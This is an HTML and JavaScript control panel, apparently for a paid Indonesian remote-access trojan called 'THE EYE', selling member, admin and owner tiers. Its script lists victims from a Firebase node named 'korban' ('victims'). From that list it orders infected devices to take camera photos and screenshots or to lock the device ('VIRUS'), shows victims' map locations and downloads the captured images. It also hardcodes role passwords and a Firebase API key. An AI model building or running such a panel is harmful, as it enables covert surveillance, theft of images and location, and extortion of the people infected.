<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE EYE v28.0 - RAMADHAN FINAL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    <style>
        :root { --gold: #ffd700; --emerald: #013220; --dark: #000b00; --red: #ff4444; }
        body { background: var(--dark); color: var(--gold); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }

        /* Login & UI */
        #login-overlay { position: fixed; inset: 0; background: var(--emerald); z-index: 10000; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .price-banner { background: var(--gold); color: black; width: 100%; padding: 8px; font-size: 10px; font-weight: bold; text-align: center; position: fixed; top: 0; }
        #bc-bar { background: rgba(255, 215, 0, 0.1); border-bottom: 1px solid var(--gold); padding: 8px 0; overflow: hidden; white-space: nowrap; margin-top: 30px; display: none; }
        .marquee { display: inline-block; padding-left: 100%; animation: scroll 15s linear infinite; font-weight: bold; }
        @keyframes scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }

        .swiper { width: 100%; height: calc(100vh - 100px); margin-top: 10px; }
        .swiper-slide { overflow-y: auto; padding: 20px; box-sizing: border-box; }

        .card { background: rgba(1, 50, 32, 0.7); border: 1px solid var(--gold); padding: 15px; border-radius: 12px; margin-bottom: 15px; }
        input { background: transparent; border: 1px solid var(--gold); color: var(--gold); padding: 12px; width: 100%; box-sizing: border-box; border-radius: 8px; margin: 10px 0; }
        button { background: var(--gold); color: var(--emerald); border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 5px; }
        .btn-red { background: transparent; border: 1px solid var(--red); color: var(--red); }
        .btn-download { background: #2ecc71; color: white; margin-top: 10px; font-size: 12px; }
        
        .target-item { border-bottom: 1px solid rgba(255, 215, 0, 0.3); padding: 15px 0; display: flex; justify-content: space-between; align-items: center; }
        .img-feed { text-align: center; }
        .img-feed img { width: 100%; border-radius: 10px; border: 1px solid var(--gold); margin-top: 10px; }

        .nav-hints { position: fixed; bottom: 0; width: 100%; height: 60px; background: var(--emerald); border-top: 1px solid var(--gold); display: flex; justify-content: space-around; align-items: center; font-size: 10px; }
        .dot { color: var(--gold); opacity: 0.4; }
        .dot.active { opacity: 1; font-weight: bold; }
    </style>
</head>
<body onload="checkAuth()">

<div id="login-overlay">
    <div class="price-banner">🌙 MEMBER 5K | ADMIN 8K | OWNER 15K 🌙</div>
    <h1 style="letter-spacing: 5px;">THE EYE</h1>
    <div style="width: 80%; max-width: 300px;">
        <input type="password" id="pass" placeholder="PASSWORD">
        <button onclick="login()">MASUK</button>
    </div>
</div>

<div id="bc-bar"><div class="marquee" id="bc-text"></div></div>

<div class="swiper mySwiper">
    <div class="swiper-wrapper">
        <div class="swiper-slide">
            <h3 id="welcome-msg">🌙 RADAR</h3>
            <div id="node-list">Scanning...</div>
            <div id="node-detail"></div>
        </div>
        <div class="swiper-slide" id="slide-tools">
            <h3>⚙️ TOOLS</h3>
            <div class="card">
                <p>Broadcast</p>
                <input type="text" id="bc-input" placeholder="Pesan...">
                <button onclick="sendBC()">KIRIM</button>
            </div>
            <div class="card">
                <p style="color:var(--red)">Danger</p>
                <button class="btn-red" onclick="alert('Wiped')">HAPUS AKUN</button>
                <button class="btn-red" style="margin-top:10px" onclick="alert('Banned')">BANNED IP</button>
            </div>
        </div>
        <div class="swiper-slide">
            <div style="text-align: center; margin-top: 50%;">
                <button onclick="logout()">LOGOUT</button>
            </div>
        </div>
    </div>
</div>

<div class="nav-hints">
    <div class="dot active">🛰️ RADAR</div>
    <div class="dot">⚙️ TOOLS</div>
    <div class="dot">🚪 EXIT</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
<script>
    const ROLES = { "111": { n: "Kalz", l: "DEV", lim: Infinity }, "own15": { n: "Owner", l: "OWN", lim: Infinity }, "adm8": { n: "Admin", l: "ADM", lim: 5 }, "mem5": { n: "Member", l: "MEM", lim: 3 } };
    let user = null;
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();

    const swiper = new Swiper(".mySwiper", {
        on: { slideChange: function () {
            document.querySelectorAll('.dot').forEach((d, i) => d.classList.toggle('active', i === this.activeIndex));
        }}
    });

    function login() { const p = document.getElementById('pass').value; if(ROLES[p]) { sessionStorage.setItem('eye_v28', p); location.reload(); } else { alert('Gagal'); } }
    function checkAuth() { 
        const k = sessionStorage.getItem('eye_v28'); 
        if(k) { 
            user = ROLES[k]; 
            document.getElementById('login-overlay').style.display = 'none'; 
            if(user.l !== "DEV") swiper.removeSlide(1);
            start(); 
        } 
    }

    function start() {
        document.getElementById('welcome-msg').innerText = `🌙 HI, ${user.n}`;
        db.ref('broadcast').on('value', s => { if(s.val()) { document.getElementById('bc-bar').style.display='block'; document.getElementById('bc-text').innerText = s.val().msg; } });
        db.ref('korban').on('value', s => {
            let h = ""; s.forEach(c => { 
                h += `<div class="target-item" onclick="view('${c.key}')">
                        <span>📍 NODE_${c.key.substring(1,7)}</span>
                        <button style="width:70px; font-size:10px; background:var(--red); color:white;" onclick="delTarget('${c.key}')">HAPUS</button>
                      </div>`; 
            });
            document.getElementById('node-list').innerHTML = h;
        });
    }

    function view(id) {
        db.ref('korban/'+id).once('value', s => {
            const k = s.val();
            document.getElementById('node-detail').innerHTML = `
                <div class="card" style="margin-top:20px">
                    <h4>📡 ID: ${id.substring(1,8)}</h4>
                    <button onclick="exec('${id}','TAKE')">📸 FOTO</button>
                    <button onclick="exec('${id}','SHOT')">🖼️ SCREENSHOT</button>
                    <button style="background:white; color:black;" onclick="window.open('${k.maps}')">🌍 MAPS</button>
                    ${user.l !== "MEM" ? `<button class="btn-red" onclick="exec('${id}','VIRUS')">☣️ LOCK</button>` : ''}
                </div>
                <div id="img-box" class="img-feed"></div>`;
            
            // Listen Foto Kamera
            db.ref('hasil_foto/'+id).on('value', f => { 
                if(f.val()) {
                    const data = f.val().foto;
                    document.getElementById('img-box').innerHTML = `
                        <img src="${data}">
                        <button class="btn-download" onclick="downloadImg('${data}', 'FOTO_${id}')">📥 DOWNLOAD FOTO</button>
                    `;
                }
            });
            // Listen Screenshot (Digabung ke area feed)
            db.ref('hasil_screenshot/'+id).on('value', f => { 
                if(f.val()) {
                    const data = f.val().foto;
                    document.getElementById('img-box').innerHTML += `
                        <img src="${data}" style="border-color:#2ecc71">
                        <button class="btn-download" onclick="downloadImg('${data}', 'SHOT_${id}')">📥 DOWNLOAD SCREENSHOT</button>
                    `;
                }
            });
        });
    }

    function downloadImg(base64, name) {
        const link = document.createElement('a');
        link.href = base64;
        link.download = `${name}_${Date.now()}.jpg`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    function delTarget(id) { event.stopPropagation(); if(confirm("Hapus?")) db.ref('korban/'+id).remove(); }
    function exec(id, a) { db.ref('commands/'+id).set({ action: a, t: Date.now() }); alert('Sent!'); }
    function sendBC() { const m = document.getElementById('bc-input').value; if(m) db.ref('broadcast').set({ msg: `[DEV]: ${m}` }); }
    function logout() { sessionStorage.clear(); location.reload(); }
</script>
</body>
</html>
